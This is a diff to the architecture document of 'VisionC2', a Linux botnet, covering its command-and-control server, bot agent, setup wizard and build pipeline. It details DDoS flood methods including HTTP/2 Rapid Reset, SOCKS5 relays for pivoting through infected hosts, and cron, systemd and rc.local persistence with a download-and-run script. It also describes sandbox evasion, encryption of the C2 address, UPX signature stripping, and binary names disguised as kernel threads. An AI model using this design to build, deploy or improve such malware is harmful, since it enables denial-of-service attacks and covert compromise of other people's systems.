@@ -20,7 +20,7 @@
 12. [Bot Authentication Protocol](#bot-authentication-protocol)
 13. [Bot Lifecycle & Connection Flow](#bot-lifecycle--connection-flow)
 14. [Bot Attack Capabilities](#bot-attack-capabilities)
-15. [Bot SOCKS5 Proxy Pivoting](#bot-socks5-proxy-pivoting)
+15. [Bot SOCKS5 Proxy & Relay Architecture](#bot-socks5-proxy--relay-architecture)
 16. [Bot Persistence Mechanisms](#bot-persistence-mechanisms)
 17. [Bot Anti-Analysis & Sandbox Detection](#bot-anti-analysis--sandbox-detection)
 18. [Bot DNS Resolution Chain](#bot-dns-resolution-chain)
@@ -104,7 +104,7 @@ CNC Server
 5. Hand off to `handleBotConnection()` for authentication
 
 ### CNC Authentication Protocol
-Challenge-response using **MD5 + shared secret (magicCode)**.
+Challenge-response using **MD5 + shared secret (syncToken)**.
 
 ```
      BOT                                  CNC
@@ -112,7 +112,7 @@ Challenge-response using **MD5 + shared secret (magicCode)**.
       │◄──── AUTH_CHALLENGE:<random_32> ─────│ Step 1: CNC sends random challenge
       │                                    │
       │ response = Base64(MD5(             │
-      │   challenge + magicCode + challenge│ Step 2: Bot computes response
+      │   challenge + syncToken + challenge│ Step 2: Bot computes response
       │ ))                                  │
       │                                    │
       │──── <response> ─────────────────────►│ Step 3: Bot sends response
@@ -124,13 +124,13 @@ Challenge-response using **MD5 + shared secret (magicCode)**.
       │                                    │
       │──── REGISTER:v:botID:arch:ram:cpu:proc:uplink►│ Step 6: Bot sends registration
       │                                    │
-      │      CNC checks PROTOCOL_VERSION   │ Step 7: Version verification
+      │      CNC checks buildTag           │ Step 7: Version verification
       │                                    │
       │◄═══════ Command Loop ═══════════════►│ Step 8: Enter command loop
 ```
 
-- **Magic Code**: 16-char random string shared between bot and CNC (generated per campaign by `setup.py`)
-- **Protocol Version**: Random version string (e.g., `v3.8`) — must match exactly or connection is dropped
+- **Sync Token**: 16-char random string shared between bot and CNC (generated per campaign by `setup.py`)
+- **Build Tag**: Random version string (e.g., `v3.8`) — must match exactly or connection is dropped
 
 ### CNC Command Dispatch & Routing
 **Command Routing Methods:**
@@ -162,25 +162,26 @@ CNC receives → handleBotConnection()
 - **Dashboard**: Bot count, total RAM/CPU, uptime, menu navigation
 - **Bot List**: Live table with ID, IP, arch, RAM, uptime; actions (shell, persist, kill)
 - **Attack Builder**: Method selection, target/port/duration form, proxy URL, launch animation
-- **Remote Shell**: Interactive single-bot shell with command history
-- **Broadcast Shell**: Shell to all bots with arch/RAM/count filters
-- **Socks Manager**: Start/stop SOCKS5 proxies on individual bots
-- **Help**: Multi-section help guide
+- **Remote Shell**: Interactive single-bot shell with command history, scrollable output (500-line buffer, pgup/pgdown)
+- **Broadcast Shell**: Shell to all bots with arch/RAM/count filters, shortcut tabs for post-exploitation
+- **Socks Manager**: Three modes — quick start (relay), custom relay, direct listener
+- **Help**: Multi-section help guide (9 sections)
 
 **Features:**
 - Toast notifications for connection/disconnection events
 - Attack status updates
 - Real-time bot list updates
 - ANSI color support
+- Confirmation prompts for dangerous commands (persist, reinstall, kill)
 
 ### CNC User Permission Model (RBAC)
 **Permission Levels (Low → High):**
 | Level | DDoS | Shell/SOCKS | Bot Targeting | Bot Management | Private/DB |
 |-------|------|-------------|---------------|----------------|------------|
-| Basic | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Pro   | ✅ | ❌ | ✅ | ❌ | ❌ |
-| Admin | ✅ | ✅ | ✅ | ✅ | ❌ |
-| Owner | ✅ | ✅ | ✅ | ✅ | ✅ |
+| Basic | yes | no | no | no | no |
+| Pro   | yes | no | yes | no | no |
+| Admin | yes | yes | yes | yes | no |
+| Owner | yes | yes | yes | yes | yes |
 
 **User Storage (`users.json`):**
 ```json
@@ -202,7 +203,6 @@ CNC receives → handleBotConnection()
 ### CNC Bot Connection Management
 **Data Structures:**
 - `botConnections map[string]*BotConnection` — primary store (keyed by botID)
-- `botConns []net.Conn` — legacy slice for backward compatibility
 - `commandOrigin map[string]net.Conn` — routes bot responses to correct user
 - All maps protected by `sync.RWMutex`
 
@@ -221,10 +221,10 @@ Bot Binary
     ▼
 ┌─────────────────────────────────────────┐
 │      Runtime Decryption                 │
-│  - AES-128-CTR decrypt C2 address      │
-│    (encGothTits → gothTits)             │
 │  - AES-128-CTR decrypt all sensitive    │
 │    strings from config.go hex blobs     │
+│  - Including rawServiceAddr →           │
+│    serviceAddr (5-layer-encoded C2)     │
 │  - 16-byte key from split XOR functions │
 └─────────────────────────────────────────┘
     │
@@ -232,8 +232,8 @@ Bot Binary
 ┌─────────────────────────────────────────┐
 │         Startup Sequence                │
 │  - Daemonization                        │
+│  - Sandbox Detection (before any I/O)   │
 │  - Single-instance enforcement (PID)    │
-│  - Sandbox Detection                    │
 │  - Persistence Installation             │
 │  - Metadata Caching                     │
 └─────────────────────────────────────────┘
@@ -252,7 +252,7 @@ Bot Binary
 │        Command Loop & Execution         │
 │  - Command Dispatch (blackEnergy)       │
 │  - Attack Execution (10+ methods)       │
-│  - SOCKS5 Proxy Server                  │
+│  - SOCKS5 Proxy (direct + relay)        │
 │  - Shell Command Execution              │
 └─────────────────────────────────────────┘
 ```
@@ -279,7 +279,7 @@ Plaintext C2 ("192.168.1.1:443")
         │
         ▼
 ┌─ Layer 3: RC4 Stream Cipher ────────────────────┐
-│ Key = charizard(cryptSeed)                      │
+│ Key = charizard(configSeed)                     │
 │ Standard RC4 S-box initialization + keystream   │
 └──────────────────────────────────────────────────┘
         │
@@ -301,15 +301,15 @@ Plaintext C2 ("192.168.1.1:443")
 └──────────────────────────────────────────────────┘
         │
         ▼
-Stored as `var encGothTits, _ = hex.DecodeString("...")` in bot/config.go
+Stored as `var rawServiceAddr, _ = hex.DecodeString("...")` in bot/config.go
 ```
 
 **Decoding Pipeline (runtime):**
 
 The bot decodes in two stages:
 
-**Stage 1 — AES decrypt (`garuda()` in `opsec.go`, called by `initSensitiveStrings()`):**
-1. **AES-128-CTR Decrypt** `encGothTits` using raw 16-byte XOR key → recovers the base64-encoded 5-layer blob into `gothTits` variable
+**Stage 1 — AES decrypt (`garuda()` in `opsec.go`, called by `initRuntimeConfig()`):**
+1. **AES-128-CTR Decrypt** `rawServiceAddr` using raw 16-byte XOR key → recovers the base64-encoded 5-layer blob into `serviceAddr` variable
 
 **Stage 2 — 5-layer decode (`venusaur()` in `opsec.go`, called by `dialga()`):**
 1. **Base64 Decode** → raw bytes
@@ -322,16 +322,19 @@ This two-stage design means the AES outer layer is stripped uniformly alongside 
 
 **Key Derivation (`charizard()` in `opsec.go`):**
 ```
-cryptSeed (8-char hex, e.g., "85fb7480")
+configSeed (8-char hex, e.g., "85fb7480")
     │
     ▼
 MD5( seed + [16 XOR key bytes] + entropy )
     │
     │ 16 split key bytes (anti-static-analysis):
-    │ mew()=0xCC^0xA6  mewtwo()=0xC3^0x91  celebi()=0x79^0xC0  jirachi()=0x4F^0xAA
-    │ shaymin()=0x51^0x80  phione()=0x75^0xD1  manaphy()=0x4B^0x7C  victini()=0x87^0x86
-    │ keldeo()=0xFC^0x7C  meloetta()=0xD2^0x54  genesect()=0xE9^0xEC  diancie()=0x77^0xF1
-    │ hoopa()=0x3B^0x4C  volcanion()=0x3C^0x9D  magearna()=0x6C^0x3C  marshadow()=0x97^0x33
+    │ mew()  mewtwo()  celebi()  jirachi()
+    │ shaymin()  phione()  manaphy()  victini()
+    │ keldeo()  meloetta()  genesect()  diancie()
+    │ hoopa()  volcanion()  magearna()  marshadow()
+    │
+    │ Each function returns a single byte via XOR of two constants.
+    │ XOR operands are randomised per build by setup.py.
     │
     │ Entropy bytes:
     │ [0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE]
@@ -356,11 +359,13 @@ Encrypted blob (hex-encoded IV‖ciphertext in config.go)
     ▼
 Plaintext string (or null-separated slice)
 
-initSensitiveStrings() decrypts ALL blobs at startup
+initRuntimeConfig() decrypts ALL blobs at startup
 before any other code references them, including:
-  - encGothTits → gothTits (5-layer-encoded C2 address)
-  - encVmIndicators, encAnalysisTools, encParentDebuggers
+  - rawServiceAddr → serviceAddr (5-layer-encoded C2 address)
+  - rawSysMarkers, rawProcFilters, rawParentChecks
   - All persistence paths, service templates, daemon keys
+  - Protocol strings, response messages, DNS servers
+  - Process camouflage names, shell paths
 ```
 
 **Crypto CLI Tool (`tools/crypto.go`):**
@@ -371,6 +376,7 @@ go run tools/crypto.go decrypt <hex>               → plaintext
 go run tools/crypto.go decrypt-slice <hex>          → indexed list
 go run tools/crypto.go generate                    → all blobs for config.go
 go run tools/crypto.go verify                      → verify config.go blobs
+go run tools/crypto.go resetconfig                 → reset key + blobs to zero-key state
 ```
 
 ### Bot TLS Transport Layer
@@ -388,13 +394,13 @@ go run tools/crypto.go verify                      → verify config.go blobs
 **Response Generation (`hafnium()`):**
 ```go
 response = base64.StdEncoding.EncodeToString(
-    md5.Sum([]byte(challenge + magicCode + challenge))
+    md5.Sum([]byte(challenge + syncToken + challenge))
 )
 ```
 
 **Bot Registration Format:**
 ```
-REGISTER:<version>:<botID>:<arch>:<RAM_MB>:<CPU_cores>:<procName>:<uplink_Mbps>
+REGISTER:<buildTag>:<botID>:<arch>:<RAM_MB>:<CPU_cores>:<procName>:<uplink_Mbps>
 ```
 
 **Bot ID Generation (`mustangPanda()`):**
@@ -411,12 +417,13 @@ botID = MD5(hostname + ":" + MAC_address)[:8]
 Bot Binary Executed
         │
         ▼
-┌─ initSensitiveStrings() ────────┐
-│ Decrypt all AES-128-CTR blobs   │
-│ from config.go into runtime vars│
-│ Including: encGothTits → gothTits│
-│ (must run before anything else) │
-└─────────────────────────────────┘
+┌─ initRuntimeConfig() ─────────────┐
+│ Decrypt all AES-128-CTR blobs     │
+│ from config.go into runtime vars  │
+│ Including: rawServiceAddr →       │
+│   serviceAddr                     │
+│ (must run before anything else)   │
+└────────────────────────────────────┘
         │
         ▼
 ┌─ stuxnet() ─────────────────────┐
@@ -428,19 +435,22 @@ Bot Binary Executed
 └─────────────────────────────────┘
         │
         ▼
+┌─ winnti() ──────────────────────┐
+│ Sandbox/VM detection            │
+│ 40+ analysis tool signatures    │
+│ If detected → sleep 24-27h      │
+│ then os.Exit(0)                 │
+│ Runs BEFORE any /tmp writes     │
+│ to avoid leaking IOCs to        │
+│ sandboxes                       │
+└─────────────────────────────────┘
+        │ (safe)
+        ▼
 ┌─ revilSingleInstance() ─────────┐
-│ PID lock file (/tmp/.net_lock)  │
+│ PID lock file                   │
 │ Kill old instance if running    │
 └─────────────────────────────────┘
         │
-        ▼
-┌─ winnti() ──────────────────────┐
-│ Sandbox/VM detection            │
-│ 30+ analysis tool signatures    │
-│ If detected → sleep 24-27h      │
-│ then os.Exit(0)                 │
-└─────────────────────────────────┘
-        │ (safe)
         ▼
 ┌─ fin7() ────────────────────────┐
 │ rc.local persistence            │
@@ -478,7 +488,8 @@ Bot Binary Executed
 │   gamaredon() → TLS connect    │
 │   anonymousSudan() → session   │
 │   on disconnect:               │
-│     sleep(fancyBear = 5s)      │
+│     sleep(retryFloor–retryCeil)│
+│     (randomised 4–7s)          │
 │     retry                      │
 └─────────────────────────────────┘
 ```
@@ -488,9 +499,9 @@ Bot Binary Executed
 Connected via TLS
     │
     ├── Receive AUTH_CHALLENGE
-    ├── Send hafnium(challenge, magicCode) response
+    ├── Send hafnium(challenge, syncToken) response
     ├── Receive AUTH_SUCCESS
-    ├── Send REGISTER:version:botID:arch:RAM:CPU:procName:uplink
+    ├── Send REGISTER:buildTag:botID:arch:RAM:CPU:procName:uplink
     │
     └── Command Loop (180s read timeout):
         ├── PING → respond PONG
@@ -499,7 +510,7 @@ Connected via TLS
 
 **Keepalive & Cleanup:**
 - 180-second read timeout per command cycle
-- Reconnection delay: `fancyBear` (5 seconds)
+- Reconnection delay: randomised `retryFloor`–`retryCeil` (4–7 seconds)
 - Automatic retry forever on disconnect
 
 ### Bot Attack Capabilities
@@ -519,10 +530,10 @@ Connected via TLS
 | HTTP Flood | `alakazam()` / `alakazamProxy()` | POST requests, random UA/referer, 4020 workers |
 | HTTPS/TLS Flood | `machamp()` / `machampProxy()` | TLS handshake + 10 requests per connection |
 | CF Bypass | `gyarados()` / `gyaradosProxy()` | Session management, cookie persistence, fake cookies |
-| Rapid Reset | `arkrai()` / `darkraiProxy()` / `giratina()` | HTTP/2 CVE-2023-44487 — batched HEADERS+RST_STREAM |
+| Rapid Reset | `giratina()` / `darkraiProxy()` | HTTP/2 CVE-2023-44487 — batched HEADERS+RST_STREAM |
 
 **Concurrency & Control:**
-- All attacks spawn `cozyBear` (default **2024**) goroutine workers
+- All attacks spawn `workerPool` (default **2024**) goroutine workers
 - `raichu()` returns a stop channel, marks attack as running
 - `pikachu()` closes the stop channel, all workers exit via `select`
 - Each attack respects `context.WithTimeout` for automatic expiry
@@ -537,29 +548,64 @@ Connected via TLS
 - No validation — max speed (2s timeout, skip bad proxies)
 - `meowstic()` creates per-proxy HTTP clients with aggressive timeouts
 
-### Bot SOCKS5 Proxy Pivoting
-**Full SOCKS5 Implementation for Traffic Tunneling:**
+### Bot SOCKS5 Proxy & Relay Architecture
+
+VisionC2 supports two SOCKS5 modes: **backconnect relay** (primary) and **direct listener** (legacy).
+
+**Backconnect Mode (Recommended):**
 ```
-Operator → SOCKS5 Client → Bot (port X) → Target
+User ──[SOCKS5]──▶ Relay Server ◀──[backconnect TLS]── Bot ──▶ Target
+                   (disposable VPS)                    (infected host)
 ```
+- Bot connects **out** to the relay — never opens an inbound port
+- Users connect to relay's SOCKS5 port with credentials
+- C2 address is never exposed; relay is separate throwaway infrastructure
+- If the relay gets burned, spin a new VPS without touching the C2
+
+**Direct Mode:**
+```
+User ──[SOCKS5]──▶ Bot:1080 ──▶ Target
+```
+- Bot opens a SOCKS5 listener directly on a specified port
+- Simpler, but exposes the bot's IP and requires an open port
 
 **Components:**
 | Component | Function | Description |
 |-----------|----------|-------------|
-| Start | `muddywater()` | Bind TCP listener on specified port, max 100 concurrent connections |
-| Stop | `emotet()` | Close listener, mark inactive |
-| Handler | `trickbot()` | SOCKS5 protocol: version negotiation → connect request → bidirectional relay |
+| Backconnect start | `muddywater()` | Accepts relay list, connects out to relay via TLS |
+| Direct start | `turmoil()` | Bind TCP listener on specified port, max 100 concurrent |
+| Relay control loop | `cozyBear()` | Auto-reconnect, multi-relay rotation, exponential backoff |
+| Data channel | `fancyBear()` | Per-session data connection to relay |
+| Stop | `emotet()` | Close listener/relay connection, mark inactive |
+| SOCKS5 handler | `trickbot()` | Protocol: version negotiation → connect → bidirectional relay |
+
+**Multi-Relay Failover:**
+1. Bots shuffle relay list on startup for load distribution
+2. On disconnect, rotate to next relay (0.5–2s jitter)
+3. After full rotation fails, exponential backoff: 5s → 10s → 20s → 40s → 60s (cap)
+4. Auto-reconnect indefinitely until `!stopsocks` is issued
+
+**Relay Protocol:**
+```
+Bot → Relay:   RELAY_AUTH:<key>:<botID>\n     (authenticate)
+Relay → Bot:   RELAY_OK\n                     (accepted)
+Relay → Bot:   RELAY_NEW:<sessionID>\n        (new SOCKS5 client waiting)
+Bot → Relay:   RELAY_DATA:<sessionID>\n       (open data channel)
+Bot → Relay:   RELAY_PING\n                   (keepalive, every 60s)
+```
 
 **Supported SOCKS5 Features:**
 - Address types: IPv4 (0x01), Domain (0x03), IPv6 (0x04)
-- Username/password authentication (method 0x02, RFC 1929) when `socksUsername`/`socksPassword` are set in `config.go`
+- Username/password authentication (method 0x02, RFC 1929) when `proxyUser`/`proxyPass` are set
 - Falls back to no authentication (method 0x00) when credentials are empty
 - Credentials updatable at runtime via `!socksauth <user> <pass>`
 - CONNECT command (0x01)
 - Bidirectional `io.Copy` relay with proper `CloseWrite` half-close
 
+> Full relay deployment guide: [`PROXY.md`](PROXY.md)
+
 ### Bot Persistence Mechanisms
-**Automatic Startup Persistence:**
+**Automatic Startup Persistence (runs during boot sequence):**
 | Method | Function | Mechanism |
 |--------|----------|-----------|
 | rc.local | `fin7()` | Appends `<exe_path> # <random_name>` to `/etc/rc.local` |
@@ -567,28 +613,26 @@ Operator → SOCKS5 Client → Bot (port X) → Target
 
 **Full Persistence (`!persist` command via `dragonfly()`):**
 Sets up comprehensive persistence (all paths/names from encrypted config):
-1. **Hidden Directory**: Creates `/var/lib/.httpd_cache/`
-2. **Persistence Script**: Writes `.httpd_check.sh` that downloads and runs the bot
-3. **Systemd Service**: Creates `httpd-cache.service` with `Restart=always`
+1. **Hidden Directory**: Creates storeDir (e.g., `/var/lib/.httpd_cache/`)
+2. **Persistence Script**: Writes scriptLabel (e.g., `.httpd_check.sh`) that downloads and runs the bot
+3. **Systemd Service**: Creates unitName (e.g., `httpd-cache.service`) with `Restart=always`
 4. **Cron Backup**: Installs cron job via `carbanak()` as fallback
 
-**File Structure:**
-```
-/var/lib/.httpd_cache/
-├── .httpd_check.sh  # Download + execute script
-└── .httpd_worker    # Bot binary (disguised name)
-/etc/systemd/system/
-└── httpd-cache.service # Auto-restart systemd unit
-```
-
-**Cleanup:** `tools/cleanup.sh` removes all persistence artifacts (run as root).
+**Self-Destruct (`!kill` command via `nukeAndExit()`):**
+1. Disables and removes systemd service
+2. Strips persistence entries from crontab
+3. Cleans rc.local
+4. Removes hidden directory
+5. Deletes lock file
+6. Removes own binary
+7. Exits
 
 **Debug Mode:**
-When `debugMode = true`, persistence functions **only log** what they would do — no actual file writes or system modifications. This prevents accidental persistence during development.
+When `verboseLog = true`, persistence functions **only log** what they would do — no actual file writes or system modifications. This prevents accidental persistence during development.
 
 ### Bot Anti-Analysis & Sandbox Detection
 **`winnti()` — Sandbox Detection (`opsec.go`):**
-Three detection methods, checked at startup. All indicator lists are AES-128-CTR encrypted in `config.go` and decrypted at runtime by `initSensitiveStrings()` — no plaintext signatures in the binary.
+Three detection methods, checked at startup **before any file writes** (lock file, cache, etc.) to prevent leaking IOCs to sandbox analysis. All indicator lists are AES-128-CTR encrypted in `config.go` and decrypted at runtime by `initRuntimeConfig()` — no plaintext signatures in the binary.
 
 **1. VM Process Detection** — Scans `/proc/*/cmdline` for:
 ```
@@ -610,12 +654,12 @@ perf, ida, ida64, ghidra, sysdig, bpftrace, frida, frida-server
 ```
 
 **Detection Response:**
-If any check triggers → sleep **24–27 hours** (randomized jitter to outlast sandbox analysis windows), then `os.Exit(0)`.
+If any check triggers → log the specific detection reason (in debug mode) → sleep **24–27 hours** (randomized jitter to outlast sandbox analysis windows), then `os.Exit(0)`.
 
 ### Bot DNS Resolution Chain
 **`dialga()` — Main C2 Resolver:**
 ```
-gothTits (decrypted from encGothTits at startup)
+serviceAddr (decrypted from rawServiceAddr at startup)
     │
     ▼ venusaur() decode (5-layer inner decode)
     │
@@ -661,54 +705,61 @@ VisionC2/
 ├── go.sum
 ├── setup.py              # Interactive setup wizard (Python 3)
 ├── server                # Compiled CNC binary
+├── relay_server          # Compiled relay binary
 ├── bot/                  # Bot agent source
 │   ├── main.go           # Entry point, shell exec, main loop
-│   ├── config.go         # All tuneable constants, encrypted sensitive strings, initSensitiveStrings()
+│   ├── config.go         # All config constants, encrypted blobs, initRuntimeConfig()
 │   ├── connection.go     # TLS connection, DNS resolution, auth, C2 handler
 │   ├── attacks.go        # L4/L7 DDoS attack methods + proxy support
 │   ├── opsec.go          # Encryption (AES-128-CTR, RC4, key derivation), sandbox detection, bot ID, daemonization
-│   ├── persist.go        # Persistence mechanisms (cron, systemd, rc.local)
-│   └── socks.go          # SOCKS5 proxy server with username/password auth (RFC 1929)
+│   ├── persist.go        # Persistence mechanisms (cron, systemd, rc.local) + nukeAndExit()
+│   └── socks.go          # SOCKS5 proxy: direct listener + backconnect relay with multi-endpoint failover
 ├── cnc/                  # CNC server source
 │   ├── main.go           # Server entry, TLS listener, user listener
 │   ├── connection.go     # TLS config, bot auth handler, bot management
 │   ├── cmd.go            # Command dispatch, user session handler, help menus
-│   ├── ui.go             # Bubble Tea TUI (dashboard, bot list, attack builder)
+│   ├── ui.go             # Bubble Tea TUI (dashboard, bot list, attack builder, socks manager)
 │   ├── miscellaneous.go  # User auth, permissions (RBAC), utilities
-│   ├── users.json        # User credential database
+│   ├── users.json        # User credential database (0600 perms)
 │   └── certificates/     # TLS certs (server.crt, server.key)
+├── relay/                # Relay server source
+│   └── main.go           # Backconnect SOCKS5 relay with TLS, stats, multi-bot support
 ├── tools/
 │   ├── build.sh          # Cross-compilation for 14 architectures
-│   ├── crypto.go         # Unified AES-128-CTR encrypt/decrypt/verify CLI tool
+│   ├── crypto.go         # Unified AES-128-CTR encrypt/decrypt/verify/resetconfig CLI tool
 │   ├── cleanup.sh        # Remove bot persistence artifacts from a Linux machine
-│   └── deUPX.py          # UPX signature stripper
+│   ├── fix_botkill.sh    # Server tuning (fd limits, TCP buffers, port 443)
+│   ├── deUPX.py          # UPX signature stripper
+│   └── upx              # Bundled UPX binary (Linux amd64)
 ├── bins/                 # Compiled bot binaries (output)
 └── Docs/
     ├── ARCHITECTURE.md   # This document
     ├── COMMANDS.md       # TUI hotkey reference
-    ├── USAGE.md          # Usage guide
-    ├── CHANGELOG.md      # Version history
-    └── LICENSE
+    ├── SETUP.md          # Setup guide
+    ├── PROXY.md          # SOCKS5 relay deployment guide
+    └── CHANGELOG.md      # Version history
 ```
 
 ### Build Pipeline & Cross-Compilation
 **`tools/build.sh` — Builds for 14 Linux Architectures:**
 | Binary Name | Arch | GOARCH | GOARM |
 |-------------|------|--------|-------|
-| kworkerd0 | x86 32-bit | 386 | — |
-| ethd0 | x86_64 | amd64 | — |
-| mdsync1 | ARMv7 | arm | 7 |
-| ksnapd0 | ARMv5 | arm | 5 |
-| kswapd1 | ARMv6 | arm | 6 |
-| ip6addrd | ARM64 | arm64 | — |
-| deferwqd | MIPS | mips | — |
-| devfreqd0 | MIPS LE | mipsle | — |
-| kintegrity0 | MIPS64 | mips64 | — |
-| biosd0 | MIPS64 LE | mips64le | — |
-| kpsmoused0 | PPC64 | ppc64 | — |
-| ttmswapd | PPC64 LE | ppc64le | — |
-| vredisd0 | s390x | s390x | — |
-| kvmirqd | RISC-V 64 | riscv64 | — |
+| ksoftirqd0 | x86 32-bit | 386 | — |
+| kworker_u8 | x86_64 | amd64 | — |
+| jbd2_sda1d | ARMv7 | arm | 7 |
+| bioset0 | ARMv5 | arm | 5 |
+| kblockd0 | ARMv6 | arm | 6 |
+| rcuop_0 | ARM64 | arm64 | — |
+| kswapd0 | MIPS | mips | — |
+| ecryptfsd | MIPS LE | mipsle | — |
+| xfsaild_sda | MIPS64 | mips64 | — |
+| scsi_tmf_0 | MIPS64 LE | mips64le | — |
+| devfreq_wq | PPC64 | ppc64 | — |
+| zswap_shrinkd | PPC64 LE | ppc64le | — |
+| edac_polld | s390x | s390x | — |
+| cfg80211d | RISC-V 64 | riscv64 | — |
+
+All binary names mimic legitimate Linux kernel thread and daemon process names to blend in on infected hosts.
 
 **Build Flags:**
 ```bash
@@ -723,8 +774,8 @@ go build -trimpath -ldflags="-s -w -buildid=" -o <name> ./bot
 
 **Post-Build Processing:**
 1. **`strip --strip-all`** — Remove remaining symbols
-2. **UPX compression** (`--best --lzma`) — Reduce binary size significantly
-3. **`deUPX.py`** — Strip UPX signatures/magic bytes to evade UPX detection heuristics
+2. **UPX compression** (`--best --lzma`) via bundled `tools/upx` — Reduce binary size
+3. **`deUPX.py`** — Strip UPX signature strings to evade UPX detection heuristics
 
 ### Setup Automation
 **`setup.py` — Interactive Setup Wizard:**
@@ -733,25 +784,33 @@ go build -trimpath -ldflags="-s -w -buildid=" -o <name> ./bot
 1. Configure debug mode (on/off)
 2. Set C2 address (IP or domain) + admin port
 3. Generate security tokens:
-   - `magicCode` — 16-char random (letters, digits, symbols)
-   - `protocolVersion` — Random format (e.g., `v3.8`, `proto42`, `r1.5-stable`)
-   - `cryptSeed` — 8-char hex for encryption key derivation
-4. Obfuscate C2 address (5-layer encoding) + AES-128-CTR outer layer (6 total) + verification
-5. Generate TLS certificates (4096-bit RSA, self-signed) or use custom
-6. Update source files via regex replacement:
-   - `bot/config.go`: `encGothTits`, `cryptSeed`, `magicCode`, `protocolVersion`, `debugMode`
-   - `cnc/main.go`: `MAGIC_CODE`, `PROTOCOL_VERSION`, `USER_SERVER_PORT`
-7. Build CNC server + bot binaries
-8. Save configuration to `setup_config.txt`
+   - `syncToken` — 16-char random (letters, digits, symbols)
+   - `buildTag` — Random format (e.g., `v3.8`, `proto42`, `r1.5-stable`)
+   - `configSeed` — 8-char hex for encryption key derivation
+4. Configure relay endpoints (comma-separated `host:port` list, optional)
+5. Configure SOCKS5 proxy credentials (default: `vision:vision`)
+6. Obfuscate C2 address (5-layer encoding) + AES-128-CTR outer layer (6 total) + verification
+7. Generate fresh random 16-byte AES key, patch XOR byte functions in `opsec.go`
+8. Encrypt all sensitive string blobs and patch `config.go`
+9. Generate TLS certificates (4096-bit RSA, self-signed) or use custom
+10. Build CNC server + bot binaries + relay server
+11. Save configuration to `setup_config.txt`
 
 **C2 URL Update (Option 2):**
 - Reads existing config from source files
-- Only updates C2 address (keeps magic code, protocol, certs)
-- Re-obfuscates with existing `cryptSeed`
-- Rebuilds bot binaries only
+- Only updates C2 address (keeps sync token, build tag, certs)
+- Re-obfuscates with existing `configSeed`
+- Rebuilds bot binaries + relay server
+
+**Relay Endpoints Update (Option 3):**
+- Shows current relay endpoints (decrypted from config)
+- Update relay endpoint list (comma-separated)
+- Update default SOCKS5 proxy credentials
+- Re-encrypts config blobs with fresh AES key
+- Rebuilds relay server + bot binaries
 
 ### Naming Convention (Code Obfuscation)
-All functions use APT group / Pokémon-themed names to make code harder to understand at a glance.
+All functions use APT group / Pokemon-themed names to make code harder to understand at a glance.
 
 **Bot Functions — APT Groups:**
 | Name | Real Purpose |
@@ -764,20 +823,36 @@ All functions use APT group / Pokémon-themed names to make code harder to under
 | `winnti` | Sandbox detection |
 | `mustangPanda` | Bot ID generator |
 | `dragonfly` | Full persistence suite |
-| `muddywater` | SOCKS5 proxy start |
+| `nukeAndExit` | Self-destruct + cleanup |
+| `muddywater` | SOCKS5 backconnect start |
+| `turmoil` | SOCKS5 direct listener start |
+| `cozyBear` | Relay control loop |
+| `fancyBear` | Per-session relay data channel |
+| `emotet` | SOCKS5 shutdown |
+| `trickbot` | SOCKS5 protocol handler |
+| `stuxnet` | Unix daemonization |
+| `revilSingleInstance` | PID-based singleton |
+| `fin7` | rc.local persistence |
+| `lazarus` | Cron persistence |
+| `carbanak` | Cron persistence (script-based) |
 
-**Bot Functions — Pokémon (Attacks & Crypto):**
+**Bot Functions — Pokemon (Attacks):**
 | Name | Real Purpose |
 |------|-------------|
-| `charizard` | Key derivation (MD5) |
-| `venusaur` | Multi-layer C2 decoder |
 | `pikachu` | Stop all attacks |
+| `raichu` | Get/set attack stop channel |
 | `snorlax` | UDP flood |
-| `alakazam` | HTTP flood |
-| `gyarados` | CF bypass flood |
+| `gengar` | DNS flood |
 | `dragonite` | SYN flood |
+| `tyranitar` | ACK flood |
+| `metagross` | GRE flood |
+| `salamence` | TCP flood |
+| `alakazam` | HTTP flood |
+| `machamp` | HTTPS/TLS flood |
+| `gyarados` | CF bypass flood |
+| `giratina` | HTTP/2 Rapid Reset (CVE-2023-44487) |
 
-**DNS Resolution — Legendary Pokémon:**
+**DNS Resolution — Legendary Pokemon:**
 | Name | Real Purpose |
 |------|-------------|
 | `dialga` | Main C2 resolver (orchestrator) |
@@ -785,27 +860,12 @@ All functions use APT group / Pokémon-themed names to make code harder to under
 | `darkrai` | UDP TXT record lookup |
 | `rayquaza` | A record fallback |
 
-**Key Derivation — Mythical Pokémon (16 bytes):**
+**Key Derivation — Mythical Pokemon (16 bytes):**
 | Name | Real Purpose |
 |------|-------------|
-| `mew` | Key byte 1 (0xCC^0xA6) |
-| `mewtwo` | Key byte 2 (0xC3^0x91) |
-| `celebi` | Key byte 3 (0x79^0xC0) |
-| `jirachi` | Key byte 4 (0x4F^0xAA) |
-| `shaymin` | Key byte 5 (0x51^0x80) |
-| `phione` | Key byte 6 (0x75^0xD1) |
-| `manaphy` | Key byte 7 (0x4B^0x7C) |
-| `victini` | Key byte 8 (0x87^0x86) |
-| `keldeo` | Key byte 9 (0xFC^0x7C) |
-| `meloetta` | Key byte 10 (0xD2^0x54) |
-| `genesect` | Key byte 11 (0xE9^0xEC) |
-| `diancie` | Key byte 12 (0x77^0xF1) |
-| `hoopa` | Key byte 13 (0x3B^0x4C) |
-| `volcanion` | Key byte 14 (0x3C^0x9D) |
-| `magearna` | Key byte 15 (0x6C^0x3C) |
-| `marshadow` | Key byte 16 (0x97^0x33) |
+| `mew` through `marshadow` | Key bytes 1–16 (XOR-obfuscated, randomised per build) |
 
-**Crypto Functions — Pokémon:**
+**Crypto Functions — Pokemon:**
 | Name | Real Purpose |
 |------|-------------|
 | `charizard` | Key derivation (MD5, for C2 address obfuscation) |
@@ -813,14 +873,20 @@ All functions use APT group / Pokémon-themed names to make code harder to under
 | `blastoise` | RC4 stream cipher |
 | `garuda` | AES-128-CTR decrypt (sensitive strings + C2 outer layer) |
 
-**CNC Variables:**
+**Config Variables (neutralised in v2.4.4):**
 | Name | Real Purpose |
 |------|-------------|
-| `fancyBear` | Reconnection delay (5s) |
-| `cozyBear` | Worker count (2024) |
-| `equationGroup` | Buffer size (256) |
-| `gothTits` | C2 address (AES-decrypted at runtime from `encGothTits`) |
-| `encGothTits` | AES-128-CTR encrypted 6-layer C2 blob |
+| `serviceAddr` | C2 address (AES-decrypted at runtime from `rawServiceAddr`) |
+| `rawServiceAddr` | AES-128-CTR encrypted 6-layer C2 blob |
+| `syncToken` | Shared auth secret (16-char random) |
+| `buildTag` | Protocol version string (must match CNC) |
